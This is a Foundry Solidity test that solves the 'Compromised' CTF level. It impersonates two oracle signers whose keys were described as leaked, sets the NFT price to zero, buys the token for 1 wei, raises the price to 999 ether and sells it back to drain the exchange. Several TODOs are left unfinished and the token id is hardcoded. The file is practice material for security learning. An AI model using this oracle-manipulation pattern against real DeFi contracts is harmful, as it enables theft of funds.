// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../../src/compromised/CompromisedLevel.sol";

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/interfaces/IERC721.sol";


interface ITrustfulOracle {
  function getMedianPrice(string calldata) external view returns (uint256);
  function postPrice(string calldata, uint256) external;
}

interface IExchange {
  function buyOne() external payable returns (uint256);
  function sellOne(uint256) external;
}

contract CompromisedTest is Test, IERC721Receiver {
  CompromisedLevel level = new CompromisedLevel();

  function setUp() public {
    level.setup();
  }

  function testExploit() public {
    ITrustfulOracle oracle = ITrustfulOracle(address(level.oracle()));

    // we got the private keys from the intercepted message
    vm.startPrank(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
    oracle.postPrice("DVNFT", 0);
    vm.stopPrank();

    vm.startPrank(0x81A5D6E50C214044bE44cA0CB057fe119097850c);
    oracle.postPrice("DVNFT", 0);
    vm.stopPrank();

    IExchange exchange = IExchange(address(level.exchange()));
    exchange.buyOne{value: 1 wei}();

    vm.startPrank(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
    oracle.postPrice("DVNFT", 999000000000000000000);
    vm.stopPrank();

    vm.startPrank(0x81A5D6E50C214044bE44cA0CB057fe119097850c);
    oracle.postPrice("DVNFT", 999000000000000000000);
    vm.stopPrank();

    IERC721 token = IERC721(address(level.nftToken()));

    // TODO
    // we get the id from a variable, then we sell
    token.approve(address(exchange), 0);
    exchange.sellOne(0);


    level.validate();
  }

   function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external override returns (bytes4) {
        // Custom logic for handling the token reception can be added here

        // TODO
        // pass the received id to a variable

        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
